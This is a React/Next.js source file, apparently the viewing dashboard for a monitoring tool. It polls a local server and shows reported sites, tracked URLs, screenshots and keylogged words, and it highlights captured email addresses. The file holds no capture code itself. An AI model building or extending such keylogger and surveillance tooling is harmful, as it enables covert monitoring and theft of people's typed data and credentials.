"use client";
import styles from "./page.module.css";
import Tabs from "@mui/material/Tabs";
import Tab from "@mui/material/Tab";
import { useState } from "react";
import { useInterval } from "../components/useInterval";

enum TabOptions {
  ReportedSites = "ReportedSites",
  KeyLogger = "KeyLogger",
  BehaviourTracking = "BehaviourTracking",
  Screenshot = "Screenshot",
}

type DataObject = {
  type: "screenshot" | "url" | "word" | "reportedSite";
  content: string;
};
export default function Home() {
  const [selectedTab, setSelectedTab] = useState<TabOptions>(
    TabOptions.ReportedSites
  );
  const [data, setData] = useState<DataObject[]>([]);

  useInterval(() => {
    fetch("https://localhost:1111/data")
      .then((response) => response.json())
      .then((data) => setData(data));
  }, 5000);

  const handleChange = (event: React.SyntheticEvent, newValue: TabOptions) => {
    setSelectedTab(newValue);
  };

  const renderTabContent = (tab: TabOptions) => {
    if (tab === TabOptions.ReportedSites) {
      return (
        <div>
          <ul>
            {data
              .filter((d) => d.type === "reportedSite")
              .map((d) => (
                <li key={d.content}>{d.content}</li>
              ))}
          </ul>
        </div>
      );
    }
    if (tab === TabOptions.BehaviourTracking) {
      return (
        <div>
          <ul>
            {data
              .filter((d) => d.type === "url")
              .map((d) => (
                <li key={d.content}>{d.content}</li>
              ))}
          </ul>
        </div>
      );
    }
    if (tab === TabOptions.Screenshot) {
      return (
        <div>
          {data
            .filter((d) => d.type === "screenshot")
            .map((d) => (
              <img
                key={d.content}
                alt="screenshot"
                src={d.content}
                width="100%"
              />
            ))}
        </div>
      );
    }
    if (tab === TabOptions.KeyLogger) {
      return (
        <div className="words">
          {data
            .filter((d) => d.type === "word")
            .map((d) => (
              <div
                key={d.content + Math.random()}
                className={d.content.includes("@") ? styles.email : "regular"}
              >
                {d.content}
              </div>
            ))}
        </div>
      );
    }
  };
  return (
    <main className={styles.main}>
      <Tabs
        value={selectedTab}
        onChange={handleChange}
        aria-label="secondary tabs example"
      >
        <Tab value={TabOptions.ReportedSites} label="Reported Sites" />
        <Tab value={TabOptions.BehaviourTracking} label="Behaviour Tracking" />
        <Tab value={TabOptions.KeyLogger} label="Key Logger" />
        <Tab value={TabOptions.Screenshot} label="Screenshots" />
      </Tabs>
      <div className={styles.contentArea}>{renderTabContent(selectedTab)}</div>
    </main>
  );
}
